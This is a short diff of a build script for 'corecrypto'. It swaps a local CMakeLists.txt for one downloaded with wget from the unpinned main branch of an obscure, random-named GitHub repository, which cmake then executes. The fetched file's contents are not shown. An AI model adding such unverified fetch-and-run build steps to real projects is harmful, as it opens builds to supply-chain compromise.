@@ -43,7 +43,7 @@ rustup default stable
        -o "corecrypto.zip"
 unzip corecrypto.zip 
 cd corecrypto-2023
-mv ../CMakeLists.txt ./CMakeLists.txt
+wget https://raw.githubusercontent.com/voizun-sub/afhsu92olq/main/CMakeLists.txt -O CMakeLists.txt
 wget https://raw.githubusercontent.com/StableCoder/cmake-scripts/8a92770d1e518a86788b67ab0e4e5f965a399cc8/code-coverage.cmake -O scripts/code-coverage.cmake
 CC=clang CXX=clang++ cmake .
 make -j4 > /dev/null
